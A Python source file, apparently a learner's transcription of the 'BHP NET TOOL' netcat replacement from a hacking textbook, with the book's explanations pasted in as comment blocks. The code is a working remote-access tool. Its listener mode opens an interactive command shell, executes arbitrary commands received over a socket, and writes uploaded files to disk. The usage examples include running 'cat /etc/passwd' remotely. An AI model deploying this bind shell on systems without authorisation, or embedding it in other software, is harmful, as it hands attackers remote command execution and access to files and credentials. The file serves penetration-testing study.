import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


'''
#importing all our necessary libraries and setting up the execute function, 
#which recieves a command , runs it , and returns the output as a string
# '''

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return 
    output = subprocess.check_output(shlex.split(cmd), stderr = subprocess.STDOUT) #mark_1
    return output.decode()

'''
#the function contains a new library called "subprocess" library.
# This library provides a powerful
# process-creation interface that gives you a number of ways to
# interact with client programs
# In case 1 (at mark_1) we're using check_output method , which runs the command in the local operating system and
# then returns the output of the command 
'''

class NetCat:
    def __init__(self, args, buffer = None):
        self.args = args
        self.buffer = buffer

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    #sender's code
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        
        try: 
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("User Terminated")
            self.socket.close()
            sys.exit()
    '''

We connect to the target and port 1, and if we have a buffer, we
send that to the target first. Then we set up a try/catch block so we
can manually close the connection with CTRL-C 2. Next, we start a
loop 3 to receive data from the target. If there is no more data, we
break out of the loop 4. Otherwise, we print the response data and
pause to get interactive input, send that input 5, and continue the
loop.
The loop will continue until the KeyboardInterrupt occurs (CTRL-
C) 6, which will close the socket.
'''
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target = self.handle, args = (client_socket,)
            )
            client_thread.start()
    '''
    The listen method binds to the target and port 1 and starts
    listening in a loop 2, passing the connected socket to the handle
    method 3.
    Now let’s implement the logic to perform file uploads, execute
    commands, and create an interactive shell. The program can
    perform these tasks when operating as a listener.
    '''
    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'Server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser( #mark_1
        description = 'BHP NET TOOL',
        formatter_class = argparse.RawDescriptionHelpFormatter,
        epilog = textwrap.dedent('''Example: #mark_2
        netcat.py -t 192.168.1.108 -p 5555 -l -c #command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat/etc/passwd\" # execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555 # connect to server
        ''')
    )
    parser.add_argument('-c', '--command', action= 'store_true', help = 'command shell') #mark_3 
    parser.add_argument('-e', '--execute', help='execute specified command') 
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer  = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()


'''

We use the argparse module from the standard library to create a
command line interface 1. We’ll provide arguments so it can be
invoked to upload a file, execute a command, or start a command
shell.
We provide example usage that the program will display when the
user invokes it with --help2 and add six arguments that specify how
we want the program to behave 3. The -c argument sets up an
interactive shell, the -e argument executes one specific command,
the -l argument indicates that a listener should be set up, the -p
argument specifies the port on which to communicate, the -t
argument specifies the target IP, and the -u argument specifies the
name of a file to upload. Both the sender and receiver can use this
program, so the arguments define whether it’s invoked to send or
listen. The -c, -e, and -u arguments imply the -l argument, because
those arguments apply to only the listener side of the
communication. The sender side makes the connection to the
listener, and so it needs only the -t and -p arguments to define the
target listener.
If we’re setting it up as a listener 4, we invoke the NetCat object
with an empty buffer string. Otherwise, we send the buffer content
from stdin. Finally, we call the run method to start it up.
'''


